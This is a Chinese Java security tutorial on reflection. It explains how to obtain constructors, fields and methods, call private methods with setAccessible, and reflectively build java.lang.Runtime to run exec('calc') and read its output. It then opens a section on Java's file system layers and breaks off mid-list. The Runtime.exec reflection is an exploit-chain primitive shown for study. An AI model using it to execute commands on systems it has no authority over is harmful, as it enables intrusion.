<h4 id="phone类"><a href="#phone类" class="headerlink" title="phone类"></a><strong>phone类</strong></h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.y5neko.sec.phone;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">phone</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">double</span> weight;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">phone</span><span class="params">()</span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">phone</span><span class="params">(String name,<span class="type">double</span> weight)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.name=name;</span><br><span class="line">        <span class="built_in">this</span>.weight=weight;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">dianyuan</span><span class="params">()</span>&#123; <span class="comment">//定义一个无返回值的方法，调用会打印&quot;开机&quot;</span></span><br><span class="line">        System.out.println(<span class="string">&quot;开机&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span>&#123; <span class="comment">//定义一个形参为String类型的方法，调用后给name属性赋值</span></span><br><span class="line">        <span class="built_in">this</span>.name=name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span>&#123; <span class="comment">//定义一个调用后返回name属性的值的方法</span></span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setWeight</span><span class="params">(<span class="type">double</span> weight)</span>&#123; <span class="comment">//定义一个形参为double类型的方法，调用后给weight属性赋值</span></span><br><span class="line">        <span class="built_in">this</span>.weight=weight;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">double</span> <span class="title function_">getWeight</span><span class="params">()</span>&#123; <span class="comment">//定义一个调用后返回weight属性的值的方法</span></span><br><span class="line">        <span class="keyword">return</span> weight;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="反射获取示例"><a href="#反射获取示例" class="headerlink" title="反射获取示例"></a><strong>反射获取示例</strong></h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.y5neko.sec.reflect;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestReflectClass</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, InstantiationException, IllegalAccessException, NoSuchMethodException, InvocationTargetException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//通过class的newInstance()方法</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">p</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;com.y5neko.sec.phone.phone&quot;</span>);</span><br><span class="line">        System.out.println(p);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">p1</span> <span class="operator">=</span> p.newInstance();</span><br><span class="line">        System.out.println(<span class="string">&quot;class的newInstance方法：\n&quot;</span> + p1);</span><br><span class="line">        <span class="comment">//反射调用方法</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">method1</span> <span class="operator">=</span> p.getDeclaredMethod(<span class="string">&quot;setName&quot;</span>, String.class);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">method2</span> <span class="operator">=</span> p.getDeclaredMethod(<span class="string">&quot;getName&quot;</span>);</span><br><span class="line">        method1.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        method1.invoke(p1,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;IQOO&quot;</span>&#125;);</span><br><span class="line">        System.out.println(method2.invoke(p1));</span><br><span class="line"></span><br><span class="line">        <span class="comment">//另一种写法,区别是要进行强制类型转化</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">p_2</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;com.y5neko.sec.phone.phone&quot;</span>);</span><br><span class="line">        <span class="type">phone</span> <span class="variable">p2</span> <span class="operator">=</span> (phone)p_2.newInstance();</span><br><span class="line">        System.out.println(<span class="string">&quot;class的第二个newInstance方法：\n&quot;</span> + p2);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//通过constructor的newInstance()方法</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">p_3</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;com.y5neko.sec.phone.phone&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> p_3.getConstructor(String.class, <span class="type">double</span>.class);</span><br><span class="line">        System.out.println(<span class="string">&quot;constructor的newInstance方法：&quot;</span>);</span><br><span class="line">        System.out.println(constructor);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">p3</span> <span class="operator">=</span> constructor.newInstance(<span class="string">&quot;IQOO&quot;</span>,<span class="number">12.5</span>);</span><br><span class="line">        System.out.println(p3);</span><br><span class="line"></span><br><span class="line">        <span class="type">phone</span> <span class="variable">pp</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">phone</span>();</span><br><span class="line">        System.out.println(pp);</span><br><span class="line">        pp.setName(<span class="string">&quot;123&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<img src="/image/image-20230705202852694.png" alt="image-20230705202852694" style="zoom:80%;" />

<p>class的newInstance()方法,需要我们类中存在无参的构造器，它通过无参的构造器来实例化，而一旦我们类中不存在无参构造器，那么第一种方法就不行了</p>
<p>我们可以用constructor的newInstance方法来直接通过有参构造器初始化：</p>
<h4 id="constructor的newInstance方法"><a href="#constructor的newInstance方法" class="headerlink" title="constructor的newInstance方法"></a>constructor的newInstance方法</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//通过constructor的newInstance()方法</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">p_3</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;com.y5neko.sec.phone.phone&quot;</span>);</span><br><span class="line"><span class="comment">//这个是调用了我们之前设置的含参构造器(忘记的上去看看第一部分构造的),后面传入的参数是String和double的原型类，因为我们之前构造器的参数类型就是String和double，所以我们这里用这个。</span></span><br><span class="line"><span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> p_3.getConstructor(String.class, <span class="type">double</span>.class);</span><br><span class="line"><span class="type">Object</span> <span class="variable">p3</span> <span class="operator">=</span> constructor.newInstance(<span class="string">&quot;IQOO&quot;</span>,<span class="number">12.5</span>);</span><br></pre></td></tr></table></figure>

<p><img src="/image/image-20230705210032713.png" alt="image-20230705210032713"></p>
<h3 id="获取类的构造器-constructor"><a href="#获取类的构造器-constructor" class="headerlink" title="获取类的构造器(constructor)"></a>获取类的构造器(constructor)</h3><p>获取类的构造器constructor一般有四种方法:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//1.获取public类型的构造器:getConstructor(class[]parameterTypes)</span></span><br><span class="line">Class p=Class.forName(<span class="string">&quot;test.phone&quot;</span>);</span><br><span class="line">Constructor constructor=p.getConstructor();</span><br><span class="line"><span class="comment">//这里你可以指定参数，来获取含参的构造器，之前演示过，不再赘述.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//2.获取全部public类型的构造器:getConstructors()</span></span><br><span class="line">Class p=Class.forName(<span class="string">&quot;test.phone&quot;</span>);</span><br><span class="line">Constructor[] constructor=p.getConstructors();</span><br><span class="line"><span class="comment">//注意这里要用数组，因为全部构造器可能并不只有一个</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//3.获取public和private类型的构造器:getDeclaredConstructor(class[]parameterTypes)</span></span><br><span class="line"><span class="comment">//当我们前面构造器类型是private的时候，运用上述两种方法是调用不到的。</span></span><br><span class="line">Class p=Class.forName(<span class="string">&quot;test.phone&quot;</span>);</span><br><span class="line">Constructor constructor=p.getDeclaredConstructor();</span><br><span class="line"></span><br><span class="line"><span class="comment">//4.获取全部类型的构造器:getDeclaredConstructors()</span></span><br><span class="line">Class p=Class.forName(<span class="string">&quot;test.phone&quot;</span>);</span><br><span class="line">Constructor[] constructor=p.getDeclaredConstructors();</span><br><span class="line"><span class="comment">//注意，这个同意要改为数组的形式</span></span><br></pre></td></tr></table></figure>

<h4 id="获取构造器实例"><a href="#获取构造器实例" class="headerlink" title="获取构造器实例"></a>获取构造器实例</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.y5neko.sec.reflect;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestReflectConstructor</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException &#123;</span><br><span class="line">        Class p=Class.forName(<span class="string">&quot;com.y5neko.sec.phone.phone&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Constructor constructor=p.getConstructor(String.class, <span class="type">double</span>.class);</span><br><span class="line">        System.out.println(<span class="string">&quot;public类型的构造器：&quot;</span>);</span><br><span class="line">        System.out.println(constructor);</span><br><span class="line"></span><br><span class="line">        Constructor[] constructors = p.getConstructors();</span><br><span class="line">        System.out.println(<span class="string">&quot;全部public类型的构造器：&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; constructors.length; i++) &#123;</span><br><span class="line">            System.out.println(constructors[i]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor1</span> <span class="operator">=</span> p.getDeclaredConstructor();</span><br><span class="line">        System.out.println(<span class="string">&quot;private和public类型的构造器：&quot;</span>);</span><br><span class="line">        System.out.println(constructor1);</span><br><span class="line"></span><br><span class="line">        Constructor[] constructors1 = p.getDeclaredConstructors();</span><br><span class="line">        System.out.println(<span class="string">&quot;全部类型的构造器：&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; constructors1.length; i++) &#123;</span><br><span class="line">            System.out.println(constructors1[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<img src="/image/image-20230706165209137.png" alt="image-20230706165209137" style="zoom:80%;" />

<h3 id="获取类的属性-field"><a href="#获取类的属性-field" class="headerlink" title="获取类的属性(field)"></a>获取类的属性(field)</h3><p>常见的获取类属性field的方法有四种:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//1.获取类的一个public类型属性:getField(String name)</span></span><br><span class="line">Class p=Class.forName(<span class="string">&quot;test.phone&quot;</span>);</span><br><span class="line">Field f=p.getField(<span class="string">&quot;name&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//2.获取类的一个全部类型的属性:getDeclaredField(String name)</span></span><br><span class="line"> Class p=Class.forName(<span class="string">&quot;test.phone&quot;</span>);</span><br><span class="line"> Field f=p.getDeclaredField(<span class="string">&quot;weight&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//3.获取类的全部public类型的属性:getFields()</span></span><br><span class="line"> Class p=Class.forName(<span class="string">&quot;test.phone&quot;</span>);</span><br><span class="line"> Field[] f=p.getFields(); <span class="comment">//同样要注意改成数组</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//4.获取类的全部类型的属性:getDeclaredFields()</span></span><br><span class="line">Class p=Class.forName(<span class="string">&quot;test.phone&quot;</span>);</span><br><span class="line">Field[] f=p.getDeclaredFields(); <span class="comment">//同样要注意改成数组</span></span><br></pre></td></tr></table></figure>

<h4 id="获取属性实例"><a href="#获取属性实例" class="headerlink" title="获取属性实例"></a>获取属性实例</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.y5neko.sec.reflect;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestReflectField</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchFieldException &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">p</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;com.y5neko.sec.phone.phone&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> p.getField(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;获取类的一个public类型属性：&quot;</span>);</span><br><span class="line">        System.out.println(field);</span><br><span class="line"></span><br><span class="line">        Field[] fields = p.getFields();</span><br><span class="line">        System.out.println(<span class="string">&quot;获取类的所有public类型属性：&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; fields.length; i++) &#123;</span><br><span class="line">            System.out.println(fields[i]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">field1</span> <span class="operator">=</span> p.getDeclaredField(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;获取类的一个所有类型属性：&quot;</span>);</span><br><span class="line">        System.out.println(field1);</span><br><span class="line"></span><br><span class="line">        Field[] fields1 = p.getDeclaredFields();</span><br><span class="line">        System.out.println(<span class="string">&quot;获取类的所有所有类型属性：&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; fields1.length; i++) &#123;</span><br><span class="line">            System.out.println(fields1[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<img src="/image/image-20230706170706245.png" alt="image-20230706170706245" style="zoom:80%;" />

<h3 id="获取类的方法-method"><a href="#获取类的方法-method" class="headerlink" title="获取类的方法(method)"></a>获取类的方法(method)</h3><p>常用的获取类的方法有三种:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//1.获取类的一个特定public类型的方法:getMethod(String name,class[] parameterTypes)</span></span><br><span class="line">Class p=Class.forName(<span class="string">&quot;test.phone&quot;</span>);</span><br><span class="line">Method m=p.getMethod(<span class="string">&quot;setName&quot;</span>, String.class); <span class="comment">//要注意这里有两个参数，后面要传入的是方法形参的类型的原型,无参函数就不用填</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//2.获取类的一个特定无论什么类型的方法:getDeclaredMethod(String name,class[] parameterTypes)</span></span><br><span class="line">Class p=Class.forName(<span class="string">&quot;test.phone&quot;</span>);</span><br><span class="line">Method m=p.getDeclaredMethod(<span class="string">&quot;setName&quot;</span>, String.class);</span><br><span class="line"></span><br><span class="line"><span class="comment">//3.获取类的全部public的方法:getMethods()</span></span><br><span class="line">Class p=Class.forName(<span class="string">&quot;test.phone&quot;</span>);</span><br><span class="line">Method[] m=p.getMethods();<span class="comment">//要注意改成数组</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//4.获取类的全部类型的方法:getDeclaredMethods()</span></span><br><span class="line"> Class p=Class.forName(<span class="string">&quot;test.phone&quot;</span>);</span><br><span class="line"> Method[] m=p.getDeclaredMethods(); <span class="comment">//同样要注意改成数组</span></span><br></pre></td></tr></table></figure>

<h4 id="获取方法实例"><a href="#获取方法实例" class="headerlink" title="获取方法实例"></a>获取方法实例</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.y5neko.sec.reflect;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestReflectMethod</span>  &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">p</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;com.y5neko.sec.phone.phone&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> p.getMethod(<span class="string">&quot;dianyuan&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;获取类的一个特定public类型的方法：&quot;</span>);</span><br><span class="line">        System.out.println(method);</span><br><span class="line"></span><br><span class="line">        Method[] methods = p.getMethods();</span><br><span class="line">        System.out.println(<span class="string">&quot;获取类的所有public类型的方法：&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; methods.length; i++) &#123;</span><br><span class="line">            System.out.println(methods[i]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">Method</span> <span class="variable">method1</span> <span class="operator">=</span> p.getDeclaredMethod(<span class="string">&quot;poweroff&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;获取类的一个特定任意类型的方法：&quot;</span>);</span><br><span class="line">        System.out.println(method1);</span><br><span class="line"></span><br><span class="line">        Method[] methods1 = p.getDeclaredMethods();</span><br><span class="line">        System.out.println(<span class="string">&quot;获取类的所有类型的方法：&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; methods1.length; i++) &#123;</span><br><span class="line">            System.out.println(methods1[i]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<img src="/image/image-20230706185205161.png" alt="image-20230706185205161" style="zoom:80%;" />

<h3 id="反射完整调用流程"><a href="#反射完整调用流程" class="headerlink" title="反射完整调用流程"></a>反射完整调用流程</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class p=Class.forName(<span class="string">&quot;test.phone&quot;</span>);           <span class="comment">//获取phone类的原型</span></span><br><span class="line">Constructor constructor=p.getConstructor();      <span class="comment">//获取无参的构造器</span></span><br><span class="line">Object o=constructor.newInstance();             <span class="comment">//实例化一个对象o</span></span><br><span class="line">Method m=p.getMethod(<span class="string">&quot;dianyuan&quot;</span>);               <span class="comment">//获取方法dianyuan</span></span><br><span class="line">m.invoke(o);                                    <span class="comment">//运用Method的invoke方法来执行这个类的方法</span></span><br><span class="line">Method m1=p.getMethod(<span class="string">&quot;setName&quot;</span>, String.class); <span class="comment">//获取方法setName</span></span><br><span class="line">Method m2=p.getMethod(<span class="string">&quot;getName&quot;</span>);               <span class="comment">//获取方法getName</span></span><br><span class="line">m1.setAccessible(<span class="literal">true</span>);							<span class="comment">//私有方法需要通过Method的setAccessible方法更改权限</span></span><br><span class="line">m1.invoke(o,<span class="string">&quot;8848&quot;</span>);                            <span class="comment">//执行setName方法，为Name属性赋值</span></span><br><span class="line">System.out.println(m2.invoke(o));             <span class="comment">//调用getName的方法并打印返回值</span></span><br></pre></td></tr></table></figure>

<h4 id="反射执行实例"><a href="#反射执行实例" class="headerlink" title="反射执行实例"></a>反射执行实例</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.y5neko.sec.reflect;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestReflect</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException &#123;</span><br><span class="line">        <span class="comment">//获取类</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">p</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;com.y5neko.sec.phone.phone&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取无参构造器</span></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> p.getConstructor();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取有参构造器</span></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor1</span> <span class="operator">=</span> p.getConstructor(String.class, <span class="type">double</span>.class);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取实例化对象(无参实例化)</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> constructor.newInstance();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取实例化对象(有参实例化)</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">o1</span> <span class="operator">=</span> constructor1.newInstance(<span class="string">&quot;IQOO&quot;</span>,<span class="number">12.5</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取方法dianyuan</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> p.getDeclaredMethod(<span class="string">&quot;dianyuan&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//通过method类的invoke方法来执行这个类的方法</span></span><br><span class="line">        method.invoke(o);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取方法setName, getName, poweroff</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">method1</span> <span class="operator">=</span> p.getDeclaredMethod(<span class="string">&quot;setName&quot;</span>, String.class);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">method2</span> <span class="operator">=</span> p.getDeclaredMethod(<span class="string">&quot;getName&quot;</span>);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">method3</span> <span class="operator">=</span> p.getDeclaredMethod(<span class="string">&quot;poweroff&quot;</span>);</span><br><span class="line">        <span class="comment">//invoke反射执行</span></span><br><span class="line">        method1.invoke(o,<span class="string">&quot;IQOO11&quot;</span>);</span><br><span class="line">        System.out.println(method2.invoke(o));</span><br><span class="line">        <span class="comment">//私有类型，通过setAccessible方法更改权限</span></span><br><span class="line">        method3.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        method3.invoke(o);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<img src="/image/image-20230706192509876.png" alt="image-20230706192509876" style="zoom:80%;" />

<h3 id="反射Runtime类命令执行"><a href="#反射Runtime类命令执行" class="headerlink" title="反射Runtime类命令执行"></a>反射Runtime类命令执行</h3><p>首先看一下Runtime类命令执行的流程</p>
<p><img src="/image/image-20230706193719020.png" alt="image-20230706193719020"></p>
<p>我们可以看到无参构造器是private的，所以无法直接使用class类的newInstance方法，所以需要getDeclaredConstructor获取，并且需要setAccessible修改作用域</p>
<p>继续跟进到我们要调用的exec方法</p>
<img src="/image/image-20230706194619747.png" alt="image-20230706194619747" style="zoom:80%;" />

<p>exec一共有六个重载函数，我们用第一个就行，public类型直接获取方法就行</p>
<p>接下来我们直接反射</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.y5neko.sec.reflect;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestReflectExec</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException &#123;</span><br><span class="line">        <span class="comment">//获取Runtime类</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取私有空参构造器</span></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> clazz.getDeclaredConstructor();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//修改作用域</span></span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//实例化对象</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> constructor.newInstance();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取exec方法</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> clazz.getMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//invoke反射调用</span></span><br><span class="line">        method.invoke(o,<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<img src="/image/image-20230706195856358.png" alt="image-20230706195856358" style="zoom:80%;" />

<p>如果需要回显则需要读取输入流</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//InputStream读取输入流</span></span><br><span class="line"><span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> process.getInputStream();</span><br><span class="line"><span class="comment">//创建reader对象</span></span><br><span class="line"><span class="type">InputStreamReader</span> <span class="variable">inputStreamReader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(in);</span><br><span class="line"><span class="comment">//转为BufferReader</span></span><br><span class="line"><span class="type">BufferedReader</span> <span class="variable">bufferedReader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(inputStreamReader);</span><br><span class="line"><span class="comment">//逐行读取</span></span><br><span class="line">String line;</span><br><span class="line"><span class="keyword">while</span> ((line = bufferedReader.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">	System.out.println(line);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="variable">exitcode</span> <span class="operator">=</span> process.waitFor();</span><br><span class="line">System.out.println(<span class="string">&quot;进程退出：&quot;</span> + exitcode);</span><br></pre></td></tr></table></figure>

<img src="/image/image-20230706203653866.png" alt="image-20230706203653866" style="zoom:80%;" />



<h2 id="Java文件系统"><a href="#Java文件系统" class="headerlink" title="Java文件系统"></a>Java文件系统</h2><p>众所周知Java是一个跨平台的语言，不同的操作系统有着完全不一样的文件系统和特性。JDK会根据不同的操作系统(<code>AIX,Linux,MacOSX,Solaris,Unix,Windows</code>)编译成不同的版本。</p>
<p>在Java语言中对文件的任何操作最终都是通过<code>JNI</code>调用<code>C语言</code>函数实现的。Java为了能够实现跨操作系统对文件进行操作抽象了一个叫做FileSystem的对象出来，不同的操作系统只需要实现起抽象出来的文件操作方法即可实现跨平台的文件操作了。</p>
<h3 id="Java-FileSystem"><a href="#Java-FileSystem" class="headerlink" title="Java FileSystem"></a>Java FileSystem</h3><p>在Java SE中内置了两类文件系统：<code>java.io</code>和<code>java.nio</code>，<code>java.nio</code>的实现是<code>sun.nio</code>，文件系统底层的API实现如下图：</p>
<img src="/image/image-20201113121413510.png" alt="img" style="zoom: 50%;" />

<h3 id="Java-IO-文件系统"><a href="#Java-IO-文件系统" class="headerlink" title="Java IO 文件系统"></a>Java IO 文件系统</h3><p>Java抽象出了一个叫做文件系统的对象:<code>java.io.FileSystem</code>，不同的操作系统有不一样的文件系统,例如<code>Windows</code>和<code>Unix</code>就是两种不一样的文件系统： <code>java.io.UnixFileSystem</code>、<code>java.io.WinNTFileSystem</code>。</p>
<img src="/image/image-20191203163038813.png" alt="img" style="zoom:80%;" />

<p><code>java.io.FileSystem</code>是一个抽象类，它抽象了对文件的操作，不同操作系统版本的JDK会实现其抽象的方法从而也就实现了跨平台的文件的访问操作。</p>
<img src="/image/image-20191203164105238.png" alt="img" style="zoom:80%;" />

<p>示例中的<code>java.io.UnixFileSystem</code>最终会通过JNI调用native方法来实现对文件的操作:</p>
<img src="/image/image-20191203164635637.png" alt="img" style="zoom: 67%;" />

<p>由此我们可以得出Java只不过是实现了对文件操作的封装而已，最终读写文件的实现都是通过调用native方法实现的。</p>
<p>不过需要特别注意一下几点：</p>
<ol>
